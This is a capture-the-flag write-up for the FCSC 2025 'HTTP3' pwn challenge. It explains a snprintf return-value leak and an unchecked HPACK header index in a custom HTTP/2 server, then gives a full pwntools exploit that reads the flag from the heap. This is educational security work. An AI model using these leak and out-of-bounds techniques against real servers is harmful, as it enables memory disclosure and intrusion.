+++
title = "FCSC 2025 | HTTP3"
+++
# [Pwn] HTTP3 |  FCSC 2025 

* [1. Checksec](#checksecs)
* [2. Writeup](#writeup)
* [3. Full exploit](#full-exploit)

## Checksecs
```
[*] '/home/botman/Documents/challenges/FCSC/pwn/http3/libc-2.39.so'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] '/home/botman/Documents/challenges/FCSC/pwn/http3/ld-2.39.so'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] '/home/botman/Documents/challenges/FCSC/pwn/http3/http3'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## TL;DR
Objective: read the flag stored into the heap

Solution:
- leak using duplicate header error
- create a fake header pointing to flag
- use oob to select fake header 
- show it using duplicate header

## Writeup
This challenge was the 3rd of a series about http servers based, this time it was based on [HTTP/2 protocole](https://www.rfc-editor.org/rfc/rfc7540). The objective of this chall was to leak the heap and read the flag from it.

### The leak
The first thing to find any leak it to start by searching for functions that return data to the user and check if there is any bad data handling like some way of returning more data than it normally would have.

So I begin with a little `grep -n -P 'print|write|put' src/*` to have an idea of where I can find interesting code:
![grep write/put/print in src](/images/http3/grep_write.png)

I will first take a look at the snprintf code because it seems to return some user-controlled data
```c
static bool handleHeaders(int tx, const char *flag, size_t id, const struct headers *headers) {
    ...
    for (size_t j = 0; j < i; j++) {
      if (string_eq(&headers->headers[j].key, key->size, key->data)) {
        char body[0x100];

        ssize_t size = snprintf(body, sizeof(body), "Duplicate header: %.*s",
                                (int)key->size, key->data);

        err400(tx, id, size, body);
        return false;
      }
    }
   ...
}
```
So what we see is that if any headers are duplicated in our request, the server will return a 400 err response with the name of the duplicated header, the interesting part is that we can controle the value of `key->size` and `key->data` so maybe we'll be able to leak to data using this function, the first thing to do in this case is to take a look at the man page of our possibly vunlerable function:

![snprintf man page](/images/http3/man.png)
And boom, we found the vuln, as you can see if the input buffer as to be truncated `snprintf` doesn't return the actual numbers of bytes wrote but the `key->size` value, so if we send a header name bigger than 0x100 we'll be able to leak the data after our body variable so we'll be able to leak the stack and maybe some heap addresses.


### OOB
Now that we have a way to leak our heap address the only thing left is to find a way to print our flag, to do so we'll use the error handler again as it's the only way we have to print data that we control, so starting from that we have to find a way to modify the `key->data` pointer to point it into our flag.

To do so I will begin by looking at the source of the key struct with this little grep `grep -n -P 'key' src/*`
![grep key in src](/images/http3/grep_key.png)
We can directly see that the `key` is populated by `getIndexed` function so we can take a look at it
```c
static const struct header *getIndexed(const struct header *table, size_t idx) {
  if (0 == idx)
    return NULL;

  const size_t s = sizeof(headers) / sizeof(*headers);

  if (idx - 1 < s)
    return &headers[idx - 1];

  return &table[idx - 1 - s];
}
```

As we can see the idx param do not seems to have any verification in this function so maybe if we control it we'll be able to get any value we want in the heap and it will be interpreted as a header, so now we have to check how the idx value is obtained, and all of that is happening in the core of the challenge, the terrifying `parse` function.

For an easier analysis I will simplify parts of the code.

```c

struct headers *parse(struct header *table, size_t size, const char data[static size]) {
  struct state state = {
      .data = data,
      .size = 8 * size,
  };

  while (state.pos < state.size) {
    size_t type;

    for (type = 0; type < 4; type++) {
      bool b;

      if (!getBit(&state, &b))
        goto err;

      if (b)
        break;
    }

    if (0 == type){
      size_t n;
      if (!getVarint(&state, &n))
        goto err;

      if (0 == n)
        goto err;

      struct header h = *getIndexed(table, n);

      if (!string_dup(&h.key, &h.key))
        goto err;

      if (!string_dup(&h.value, &h.value))
        goto err;

      ret = headers_push(ret, &h);
      if (NULL == ret)
        return NULL;
    } else if (2 == type) {
      ...
    }
    else {
      ...
    }
  }
}
```

Basically the parse function will determine the type of header by looking at the numbers of bits sets in the first byte, type 0 is encoded as `0b10000000`, type 1 `0b11000000`, ... And each type have a function, so 0 is simply an indexed header, that means that the header returned will be the header at the index specified after the type bits, for example if you want to specify the header `:method GET` you'll have to send the header `0x80 | 0x1` with `0x80` as the header type and `0x1` the index of the header in the headers table.

And we can see that before there is not verifications of the `n` variable so we found our second vulns, now we just have to add all of this together and write an exploit that will:
- leak the heap address and the flag address
- write a fake header into the heap using the type 3 which allow us to add new custom headers into the header table
- find the correct offset and use the oob to fetch our fake header which point to our flag twice so we trigger the error and get the flag

And here it is:

## Full exploit
```py
from pwn import p32, flat, u64, p64
from hpack import Encoder

CHALL = "./http3"
LIBC = "./libc-2.39.so"


class Frame():
    def __init__(self, io, frame_type, flags, id, data, size=0):
        if size == 0:
            self.size = len(data)
        else:
            self.size = size
        self.frame_type = frame_type
        self.flags = flags
        self.id = id
        self.data = data
        self.io = io

    @property
    def header(self):
        data = [
            self.size >> 16, self.size >> 8, self.size >> 0,
            self.frame_type,
            self.flags,
            self.id >> 24, self.id >> 16, self.id >> 8, self.id >> 0
        ]
        data = [p32(i, endianness="big")[-1] for i in data]

        header = b"".join([int.to_bytes(i) for i in data])
        return header

    def __recv_header(self):
        header = self.io.recv(9, timeout=0.1)
        len = int.from_bytes(header[:3])

        if len <= 0:
            return header

        return self.io.recv(len)

    def send(self, recv=True):
        self.io.send(self.header)
        self.io.send(self.data)
        if recv:
            self.__recv_header()
            return self.__recv_header()


# This function was stolen from skuuk exploit
def pack_int(n, prefix):
    N = 8 - len(prefix)
    if n < (1 << N) - 1:
        return bytes([int(prefix+f"{n:b}".rjust(N, "0"), 2)])
    n -= (1 << N)-1
    bts = []
    first = True
    while first or n:
        bt = n & 0x7f
        if n >= 0x7f:
            bt |= 0x80
        bts.append(bt)
        n >>= 7
        first = False
    return bytes([int(prefix+f"{(1 << N)-1:b}", 2)]+bts)


def exploit(io, elf):
    # handshake
    io.send(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    io.recv()

    frame = Frame(io, 0x4, 0, 0, b'')
    frame.send()

    # leak
    e = Encoder()
    data = [
        ("A"*0xfff, "GET"),
        ("A"*0xfff, "GET")
    ]
    data = e.encode(data, huffman=False)

    ret = Frame(io, 0x1, 0, 0, data).send()
    io.recv(timeout=0.01) # some weird things happened in remote so I had to add this recv

    flag = u64(ret[304:][:8])
    io.success("flag @ 0x%hx" % flag)

    # fake header, size = 0x80, data = flag
    data = [
        p64(0x80)+p64(flag), b'flag'
    ]
    data = e.add(data, False)
    ret = Frame(io, 0x1, 0, 0, data).send()

    # OOB
    index = (0x23040 >> 5)+1+61
    data = flat(
        pack_int(index, "1"),
        pack_int(index, "1"),
    )
    ret = Frame(io, 0x1, 0, 0, data).send()
    flag = ret.split(b': ')[-1].decode()
    return flag
```


[download here](/exploits/http3.py)

**Written by *0xB0tm4n***
